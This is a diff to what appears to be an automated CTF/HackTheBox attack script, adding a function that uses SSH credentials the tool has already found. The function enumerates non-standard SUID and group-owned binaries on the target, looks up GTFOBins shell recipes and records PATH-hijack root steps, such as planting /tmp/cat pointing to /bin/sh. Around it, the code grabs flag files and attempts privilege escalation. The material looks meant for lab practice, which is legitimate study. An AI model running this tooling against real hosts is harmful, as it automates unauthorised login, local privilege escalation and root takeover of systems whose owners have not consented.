@@ -65,6 +65,7 @@ def run(host: HostReport, opts) -> None:
                 severity="high", category="access", port=22, service="ssh",
                 evidence=f"{user}:{pw}"))
             _grab_user_flags(host, ip, user, pw)
+            _enum_suid(host, ip, user, pw)
             _privesc(host, ip, user, pw)
             return   # a working login + privesc attempt is enough
 
@@ -115,6 +116,45 @@ def _grab_user_flags(host: HostReport, ip, user, pw) -> None:
                    "cat ~/user.txt ~/flag.txt /home/*/user.txt 2>/dev/null", timeout=15)
     for tok in knowledge.find_flags(out or ""):
         _flag(host, tok, f"{user}@{ip}:~", "USER")
+
+
+# Standard SUID binaries present on a stock Ubuntu — anything else is notable.
+_STD_SUID = {"sudo", "su", "mount", "umount", "passwd", "chsh", "chfn",
+             "gpasswd", "newgrp", "pkexec", "fusermount", "fusermount3",
+             "ping", "ping6", "dbus-daemon-launch-helper", "ssh-keysign",
+             "at", "snap-confine", "vmware-user-suid-wrapper", "polkit-agent-helper-1"}
+
+
+def _enum_suid(host: HostReport, ip, user, pw) -> None:
+    """Enumerate non-standard SUID binaries and the user's group-owned binaries
+    — the usual local-root vectors (custom SUID, GTFOBins, PATH hijack)."""
+    rc, out = _ssh(ip, user, pw,
+                   "find / -perm -4000 -type f 2>/dev/null; echo '---'; "
+                   "id; echo '---'; for g in $(id -Gn); do "
+                   "find / -group $g -type f 2>/dev/null | grep -vE "
+                   "'^/(proc|sys|run)'; done", timeout=30)
+    suid_part = out.split("---")[0] if "---" in out else out
+    unusual = [b.strip() for b in suid_part.splitlines()
+               if b.strip().startswith("/")
+               and b.rsplit("/", 1)[-1] not in _STD_SUID]
+    if unusual:
+        for b in unusual[:8]:
+            name = b.rsplit("/", 1)[-1]
+            recipe = gtfobins.lookup(name)
+            hint = (f" — GTFOBins: {recipe['shell']}" if recipe and recipe.get("shell")
+                    else " — check GTFOBins; if it runs another binary by name, "
+                         "try a PATH hijack (put a malicious 'cat'/etc. in $PATH).")
+            utils.log("hot", f"non-standard SUID: {b}{hint[:60]}", indent=2)
+        host.add(Finding(
+            title=f"Non-standard SUID binaries ({len(unusual)}) — privesc vector",
+            detail="\n".join(unusual[:15]) + "\n\nEach runs as its owner (often "
+                   "root). Check GTFOBins; a custom binary that calls another "
+                   "command WITHOUT a full path (e.g. `cat`) is a PATH-hijack "
+                   "root: write /tmp/cat -> /bin/sh, chmod +x, "
+                   "export PATH=/tmp:$PATH, run it. (HTB Oopsie: "
+                   "/usr/bin/bugtracker.)  See notes/linux-privesc.md.",
+            severity="high", category="access", port=22, service="ssh",
+            confidence="potential", evidence="\n".join(unusual)))
 
 
 def _privesc(host: HostReport, ip, user, pw) -> None:
